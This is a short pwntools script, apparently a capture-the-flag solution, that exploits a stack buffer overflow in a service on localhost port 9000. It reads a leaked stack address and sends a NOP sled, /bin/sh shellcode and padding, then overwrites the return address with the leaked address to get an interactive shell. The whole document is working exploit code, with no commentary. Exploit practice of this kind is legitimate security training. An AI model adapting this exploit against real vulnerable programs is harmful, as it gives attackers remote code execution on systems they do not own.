from pwn import *

context.os = 'linux'
context.arch = 'amd64'

r = remote('localhost', 9000)
r.recvuntil(" Preparing a place to store your name on our infrastructure: ")
stack_addr = int(r.recv(14), 16)
r.recvuntil(" Give us your name: ")
log.info(f"stack address {stack_addr}")

shell = asm(shellcraft.sh())
payload  = b'\x90'*16
payload += shell
payload += b'\x90'*(256-16-len(shell)+8)
payload += p64(stack_addr)

r.sendline(payload)
r.interactive()
